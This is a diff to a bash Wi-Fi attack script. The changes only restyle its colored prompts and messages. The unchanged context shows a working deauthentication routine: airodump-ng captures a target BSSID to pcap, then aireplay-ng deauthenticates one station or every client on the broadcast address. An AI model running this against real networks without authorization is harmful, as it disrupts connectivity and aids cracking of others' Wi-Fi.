@@ -39,7 +39,7 @@ check_interface() {
 }
 
 print_error() {
-	printf "$BOLD$RED%s\n$NORMAL" "$1" >&2
+	printf "[$BOLD$RED!$NORMAL] %s\n" "$1" >&2
 }
 
 set_monitor() {
@@ -70,8 +70,8 @@ attack() {
 	fi
 	airodump_pid=$!
 
-	read -r -p "${BOLD}${RED}[-] Enter the BSSID: $NORMAL" bssid
-	read -r -p "${BOLD}${YELLOW}[-] Enter the channel: $NORMAL" channel
+	read -r -p "[${BOLD}${RED}-${NORMAL}] Enter the BSSID: " bssid
+	read -r -p "[${BOLD}${YELLOW}-${NORMAL}] Enter the channel: " channel
 	kill $airodump_pid 2> /dev/null; wait $airodump_pid
 
 	$TERMINAL -e airodump-ng -c "$channel" --bssid "$bssid" -w capture --output-format pcap "$interface" &
@@ -81,9 +81,9 @@ attack() {
 		station=FF:FF:FF:FF:FF:FF
 		sleep 4
 	else 
-		read -r -p "${BOLD}${RED}[-] Enter the station: $NORMAL" station
+		read -r -p "[${BOLD}${RED}-${NORMAL}] Enter the station: " station
 	fi
-	printf "$BOLD$CYAN%s\n$NORMAL" "[+] Deauthenticating $station"
+	printf "[${BOLD}${RED}+${NORMAL}] Deauthenticating %s\n" "$station"
 	aireplay-ng --deauth "$COUNT" -a "$bssid" -c "$station" "$interface" > /dev/null
 	sleep 4
 	kill $airodump_pid 2> /dev/null; wait $airodump_pid 
